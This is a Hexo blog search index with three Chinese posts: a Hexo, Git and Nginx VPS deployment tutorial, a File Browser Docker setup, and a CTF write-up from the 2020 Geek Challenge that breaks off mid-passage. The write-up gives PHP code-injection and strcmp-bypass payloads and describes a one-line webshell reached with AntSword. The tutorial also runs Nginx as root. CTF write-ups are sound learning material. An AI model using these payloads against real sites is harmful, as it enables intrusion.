<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo+Git+VPS 轻松打造属于自己的博客</title>
      <link href="2020/12/04/hexo+vps+git%E6%90%AD%E5%BB%BA/"/>
      <url>2020/12/04/hexo+vps+git%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-VPS-Git的一系列搭建教程"><a href="#Hexo-VPS-Git的一系列搭建教程" class="headerlink" title="Hexo+VPS+Git的一系列搭建教程"></a>Hexo+VPS+Git的一系列搭建教程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li>感谢你可以看到这篇文章，欢迎与我继续交流</li><li>转载请注明出处！</li></ol><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>hexo部署在本地，将生成的网页文件通过Git上传到自己的VPS中，实现自动化更新。</p><h2 id="整个搭建流程"><a href="#整个搭建流程" class="headerlink" title="整个搭建流程"></a>整个搭建流程</h2><p>第一部分：本地Hexo初始化，包括安装NodeJS、Git。</p><p>第二部分：服务器的搭建，包括安装Git，Nginx配置、创建git用户。</p><p>第三部分：使用Git自动化部署发布自己的博客。</p><h2 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>本次我们的本地环境为：windows 10系统，所有以下在windows10 64位下进行演示。</p><p>首先你要去Node官网下载<a href="http://nodejs.org/">Node.js</a>！然后还要下载<a href="https://git-scm.com/download/win">git</a>！</p><p>废话少说，开整！！！</p><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>进入官网<a href="http://nodejs.org/">Node.js</a>，选择我们需要的安装包下载，打开安装包一直next，下一步就可以了，默认安装就行。</p><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><p>打开我们的官网<a href="https://git-scm.com/download/win">git</a>，我们选择windows版本的下载</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/git%E5%AE%89%E8%A3%85_1.png" alt="git安装"></p><p>我们这边的也是一直next，下一步就可以了。直接安装官方默认的来就行！</p><p>安装完后，我们右键会有Git Bash，安装完成后的Git Bash，其作用与系统自带的CMD命令行相同，系统中的CMD命令同样可以在Git Bash中完成。我们后面的本地运行窗口都在这里完成。</p><p>git安装完成后，需要进行配置</p><p>输入如下，其中” “中的your name 和your email为你的Git Hub用户名(非昵称)与邮箱（这样也方便以后在Github的使用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your name&quot;</span><br><span class="line">git config --global user.email &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>并可通过以下命令查询用户名与邮箱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>我们在本地找一个地方做为我们Hexo的数据数据存放，例如我的存放目录为<strong>E:\blog</strong>，我们在这个目录下右键打开<strong>Git Bash Here</strong></p><p>先查看我们的Node 和 npm有没有安装好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/hexo%E5%AE%89%E8%A3%85_1.png" alt="hexo安装"></p><p>因为npm为国外源，下载速度感人。我们需要先来安装个cnpm使下载指向国内源以提高速度，以后下载什么东西都用cnpm了。</p><p>这里我们选择使用淘宝镜像下载 cnpm，在上面终端继续输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>下载完后查看cnpm版本，查询成功则证明安装完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm -v</span><br></pre></td></tr></table></figure><p><strong>现在我们正式的开始下载Hexo</strong>，使用cnpm下载hexo！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>现在我们安装组件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo --save</span><br></pre></td></tr></table></figure><p>这步是关键，我们需要进行Hexo的初始化（注意我们的路径）。我们可以使用<code>pwd</code>查看该目录是否为我们希望的地址。</p><p><strong>注意</strong>：这里我们的目录要是一个空的，若blog文件夹非空，则会报错！</p><p>这里等待时间较长，约几分钟。完成后就可以在目录下看到数据文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h3 id="Hexo的一些常用命令"><a href="#Hexo的一些常用命令" class="headerlink" title="Hexo的一些常用命令"></a>Hexo的一些常用命令</h3><p>这里我们经常用到的有三个命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#用来清理缓存文件</span><br><span class="line">hexo g      #生成文件</span><br><span class="line">hexo s     #运行本地服务器，端口默认4000</span><br><span class="line">hexo d   #推送到服务器</span><br></pre></td></tr></table></figure><p>这里我们可以运行<code>hexo s</code>在本地进行测试，打开浏览器输入<code>127.0.0.1:4000</code>看到：</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/hexo%E5%AE%89%E8%A3%85_2.png" alt="hexo安装"></p><p><strong>看到这个就说明我们的本地环境搭建完成！！！</strong></p><h2 id="VPS服务器搭建"><a href="#VPS服务器搭建" class="headerlink" title="VPS服务器搭建"></a>VPS服务器搭建</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>我这里使用的是CentOS 8.2，使用别的发行版具体命令会有一些区别！</p><h3 id="初始化服务器"><a href="#初始化服务器" class="headerlink" title="初始化服务器"></a>初始化服务器</h3><p>如果你是一个新的服务器我们先先进行初始化，更新操作可以跳过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><h3 id="添加git用户"><a href="#添加git用户" class="headerlink" title="添加git用户"></a>添加git用户</h3><p>这里我们新添加一个用户来运行git服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure><blockquote><p>虽说现在的仓库只有我们自己在使用，新建一个 <code>git</code> 用户显得不是很有必要，但是为了安全起见，还是建议使用单独的 <code>git</code> 用户来专门运行 <code>git</code> 服务</p></blockquote><h3 id="git用户证书登录"><a href="#git用户证书登录" class="headerlink" title="git用户证书登录"></a>git用户证书登录</h3><p>我们这里需要创建证书登录，需要我们在本地生成RSA进行SSH加密通讯，可以防止每次 push 都输入密码</p><p>我们打开本地的<strong>Git Bash Here</strong>，your email填写刚刚我们本地填过的，按3次Enter就完成的创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>我们的密钥对就可以在本地的<code>C:\Users\自己的用户名\.ssh</code>的目录下看到！</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/git%E8%AF%81%E4%B9%A6%E7%99%BB%E5%BD%95.png" alt="git证书登录"></p><p>这个id_rsa是我们的私钥，id_rsa_pub是我们的公钥，打开我们的这个公钥，复制出来我们待会要用到。</p><p>打开VPS服务器，我们需要添加公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su git# 切换到git用户</span><br><span class="line">mkdir .ssh</span><br><span class="line">vim &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorized_keys# 在git用户家目录中添加我们的公钥，按i进行编辑，复制刚刚的公钥进入，按ESC 再 :wq 保存退出</span><br></pre></td></tr></table></figure><p>我们可以SSH登录测试一下，如果我们登录成功就说明我们成功了。本地<strong>Git Bash Here</strong>输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh git@你服务器IP</span><br></pre></td></tr></table></figure><p>如果之前登陆过一个之前连过的VPS，由于公钥不一样了，所以无法登录，提示信息是 KEY 验证失败。我们可以输入下面的命令来更新信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -R 你要访问的IP地址</span><br></pre></td></tr></table></figure><p>这里我们可以限制git用户的SSH，毕竟这里是一个安全隐患。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>我们打开这个文件，在文件末尾可以找到类似这样的行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git:x:1002:1002::&#x2F;home&#x2F;git:&#x2F;bin&#x2F;bash      改为：       git:x:1002:1002::&#x2F;home&#x2F;git:&#x2F;usr&#x2F;bin&#x2F;git-shell</span><br></pre></td></tr></table></figure><p>修改后，我们只允许用户进行<code>git push/pull</code> 操作。</p><h3 id="初始化-Git-仓库"><a href="#初始化-Git-仓库" class="headerlink" title="初始化 Git 仓库"></a>初始化 Git 仓库</h3><p>我们要在服务器找个地方存放我们的Git仓库和www的根目录</p><p>这里是我的目录结构，就是个参考，hexo_blog作为博客根目录，/www/repo/blog.git 作为hexo的git仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;www</span><br><span class="line">|--hexo_blog</span><br><span class="line">|--repo</span><br><span class="line">|--blog.git</span><br></pre></td></tr></table></figure><p>命令如下，我们用root用户输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;www&#x2F;hexo_blog</span><br><span class="line">mkdir -p &#x2F;www&#x2F;repo</span><br><span class="line"></span><br><span class="line">cd &#x2F;www&#x2F;repo</span><br><span class="line">sudo git init --bare blog.git</span><br></pre></td></tr></table></figure><h3 id="配置-git-hooks"><a href="#配置-git-hooks" class="headerlink" title="配置 git hooks"></a>配置 git hooks</h3><p>关于 hooks 的详情内容可以<a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">参考这里</a>。</p><p>我们这里要使用的是 <code>post-receive</code> 的 hook，这个 hook 会在整个 git 操作过程完结以后被运行。</p><p>在 <code>blog.git/hooks</code> 目录下新建一个 <code>post-receive</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;www&#x2F;repo&#x2F;blog.git&#x2F;hooks</span><br><span class="line">vim post-receive</span><br></pre></td></tr></table></figure><p>在 <code>post-receive</code> 文件中写入如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --work-tree&#x3D;&#x2F;www&#x2F;hexo_blog --git-dir&#x3D;&#x2F;www&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure><p>注意，<code>/www/hexo_blog</code> 要换成你自己的部署目录。上面那句 git 命令可以在我们每次 push 完之后，把部署目录更新到博客的最新生成状态。这样便可以完成达到自动部署的目的了。</p><p>不要忘记设置这个文件的可执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure><p>最后我们把<code>blog.git</code>和<code>hexo_blog</code>的拥有者给git用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R git:git &#x2F;www&#x2F;repo&#x2F;blog.git</span><br><span class="line">sudo chown -R git:git &#x2F;www&#x2F;hexo_blog</span><br></pre></td></tr></table></figure><h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>安装Nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc make zlib-devel pcre pcre-devel openssl-devel</span><br><span class="line">sudo yum install -y nginx</span><br></pre></td></tr></table></figure><p>完成安装后，我们先对Nginx进行配置，再启动Nginx服务</p><ol><li><p>打开Nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>修改Nginx服务80端口的root目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80 default_server;</span><br><span class="line">        listen       [::]:80 default_server;</span><br><span class="line">        server_name  antlers.xyz;# 这里是你的域名</span><br><span class="line">        root         &#x2F;www&#x2F;hexo_blog;# 这里要改成网站的根目录</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>这里最上面还有一个用户的设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user root;# 这里我就改为的root用户</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br></pre></td></tr></table></figure></li></ol><p>启动Nginx服务，如果是使用yum安装的话就是用以下的指令进行启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx</span><br></pre></td></tr></table></figure><p>我们随便写一个index.html文件放到80端口的根目录（/www/hexo_blog）下进行测试，IP访问一下！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Test！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功后我们VPS服务器端的配置就全部结束了！</p><h2 id="本地Hexo配置文件配置"><a href="#本地Hexo配置文件配置" class="headerlink" title="本地Hexo配置文件配置"></a>本地Hexo配置文件配置</h2><p>首先回顾一下，我们是否完成了所有的配置，本地git用户是否可以SSH连接到服务器。</p><p>打开我们Hexo本地的配置目录<code>_config.yml</code>，找到最后的一段进行修改。保留唯一的deploy配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@你的服务器IP:&#x2F;www&#x2F;repo&#x2F;blog.git# 格式：服务器用户名@IP:Git仓库目录</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>保存后打开<strong>Git Bash Here</strong>，推送文章到服务器端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="本地Hexo的目录结构"><a href="#本地Hexo的目录结构" class="headerlink" title="本地Hexo的目录结构"></a>本地Hexo的目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hexo目录结构：</span><br><span class="line"></span><br><span class="line">├── node_modules：是依赖包</span><br><span class="line">├── public  #存放被解析markdown、html文件</span><br><span class="line">├── scaffolds #当您新建文章时，根据 scaffold生成文件</span><br><span class="line">├── source  #资源文件夹</span><br><span class="line">|   └── _posts #博客文章目录</span><br><span class="line">└── themes #主题</span><br><span class="line">├── _config.yml   #网站的配置信息。标题、网站名称等</span><br><span class="line">├── db.json：#source解析所得到的</span><br><span class="line">├── package.json  # 应用程序的配置信息</span><br></pre></td></tr></table></figure><p>我们只要将文章丢到<code>source\_posts</code>里就好了，再<code>hexo clean</code>、<code>hexo g</code>、<code>hexo d</code>就好了！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> git </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一款好用的文件管理器——File Browser</title>
      <link href="2020/12/02/File%20browser/"/>
      <url>2020/12/02/File%20browser/</url>
      
        <content type="html"><![CDATA[<h1 id="基于Docker的File-Browser搭建"><a href="#基于Docker的File-Browser搭建" class="headerlink" title="基于Docker的File Browser搭建"></a>基于Docker的File Browser搭建</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>File Browser 是一个基于 Web 的文件管理器。它可以使你随时随地的对设备的文件进行基本的管理操作，如：创建、删除、移动、复制等。它除了可以让你进行文件管理之外，还有一些其他的功能。它支持多个用户的管理，而且每个用户可以拥有自己可以访问的文件和权限。它还支持文件分享，就行网盘那样，你可以通过它来向你的朋友分享文件。你还可以用它来执行一些 Linux 命令，比如你想要在当前目录下克隆一个代码库，就可以用它来执行<code>git</code>等命令。</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>这里我们使用docker进行搭建，只需要一行命令就可以完成搭建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart&#x3D;always --name filebrowser -d -v &#x2F;opt&#x2F;filebrowser:&#x2F;srv -v &#x2F;opt&#x2F;filebrowserconfig.json:&#x2F;etc&#x2F;config.json -v &#x2F;opt&#x2F;filebrowser&#x2F;database.db:&#x2F;etc&#x2F;database.db -p 2334:80 filebrowser&#x2F;filebrowser</span><br></pre></td></tr></table></figure><p> <strong>命令解释：</strong></p><ul><li><code>--restart=always</code>：docker一启动就启动这个容器</li><li><code>--name filebrowser</code>：本地管理时的容器名</li><li><code>-v /opt/filebrowser:/srv</code>：目录或文件的对应关系，前面是本地目录，后面是对应容器的目录</li><li><code>-p 8080:80</code>：端口对应，前面是我们服务器的端口，对应容器的80端口</li></ul><p>我们等待运行完成后就可以访问 IP+8080 ，默认用户名和密码都是admin，记得更改！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> File Browser </tag>
            
            <tag> 教程 </tag>
            
            <tag> docker </tag>
            
            <tag> vps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020极客大挑战-WP</title>
      <link href="2020/11/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>2020/11/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="朋友的学妹"><a href="#朋友的学妹" class="headerlink" title="朋友的学妹"></a>朋友的学妹</h3><p>签到题</p><p>直接查看页面源码就可以看见一个flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag&#x3D;U1lDe0YxQF80c19oNExwZnVsbGxsbGx9--&gt;</span><br></pre></td></tr></table></figure><h3 id="EZwww"><a href="#EZwww" class="headerlink" title="EZwww"></a>EZwww</h3><h4 id="考点：网站备份文件泄露"><a href="#考点：网站备份文件泄露" class="headerlink" title="考点：网站备份文件泄露"></a>考点：网站备份文件泄露</h4><p>提示信息为：备份是个“好🤺”习惯</p><p>我们就可以首先想到网站备份文件，类似于.bak </p><blockquote><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</p></blockquote><p>刚开始，我尝试了好多文件名+bak，但还是没找到目标文件，最后看到题目提示，www，猜测可能备份文件名为：<strong>www</strong></p><p>得到的压缩包有一个flag!!!!.txt，可惜，这个是假的flag</p><p>再看另一个index.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$key2</span> = base64_decode(<span class="string">&#x27;c3ljbDB2ZXI=&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> === <span class="variable">$key2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//this is a true flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到这个，那就很简单了</p><p>post提交一个a的参数，要求于**$key2**的值相等，这就要求我们先把$key2用base64接出来</p><p>我们现在只需要<strong>post传入a参数</strong>，值为：<strong>sycl0ver</strong></p><blockquote><p>SYC{Backup_1s_4_good_h4bit_l0l}</p></blockquote><h3 id="刘壮的黑页"><a href="#刘壮的黑页" class="headerlink" title="刘壮的黑页"></a>刘壮的黑页</h3><h4 id="考点：GET-amp-POST提交"><a href="#考点：GET-amp-POST提交" class="headerlink" title="考点：GET&amp;POST提交"></a>考点：GET&amp;POST提交</h4><p>我们查看页面，看到这样一段话<strong>你听说过请求方式吗？</strong>，再看到页面最下面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$passwd</span> === <span class="string">&#x27;syclover&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是比较简单的题目，只需要我们分别用<strong>POST</strong>和<strong>GET</strong>传入两参数，就好了</p><blockquote><p>SYC{d0_y0u_k0nw_GET?}</p></blockquote><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><h4 id="考点：POST传参，phpinfo，绕过sha1"><a href="#考点：POST传参，phpinfo，绕过sha1" class="headerlink" title="考点：POST传参，phpinfo，绕过sha1"></a>考点：POST传参，phpinfo，绕过sha1</h4><p>进入后题目后发现页面回显405</p><p>看到题目提示：In addition to the GET request method, there is another common request method…</p><p>用post传参，并且日常看看能不能看到<strong>phpinfo.php</strong></p><p>尝试后找到这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.224.119:8000&#x2F;?a&#x3D;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;post传</span><br><span class="line">a&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>就看到一点东西，（小声哔哔一下，我这里的环境拿火狐使用就没问题，chrome就有问题了）</p><p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98_welcome.png" alt="welcome"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个就是一道很简单的一句话木马了，我们拿蚁剑连接，看到在根目录下就有一个flag</p><blockquote><p>SYC{1iuzHuang_yyd_G0d!}</p></blockquote><h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><h4 id="考点：绕过"><a href="#考点：绕过" class="headerlink" title="考点：绕过"></a>考点：绕过</h4><blockquote><p>Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.</p><p>Note that a and b cannot be equal. </p><p>请使用GET请求传入变量a和b，将其与strcmp进行比较，并让strcmp返回NULL值。</p><p>请注意，a和b不能相等。</p></blockquote><p>看到提示信息我们就可以开始构造变量a和b了，注意最后一句，==a和b不能相等==，我觉得这个是重点，既然这样的话，我们可以借用一下前面题目的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;&amp;b&#x3D;1</span><br></pre></td></tr></table></figure><p>ok，第一部分已经绕过了，现在要我们用<strong>POST传入一个参数c，要求非数字，并以使其等于123</strong></p><blockquote><p>OKOK,You got the first step.<br>Please POST a variable c that is not a number to make it equal to 123 </p><p>好的，您迈出了第一步。<br>请发布一个非数字的变量c以使其等于123</p></blockquote><p>我测试了一下，只有当我用<strong>纯数字</strong>的时候，才会有报错，因此我只需要加入一个空格（%23）就可以绕过了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 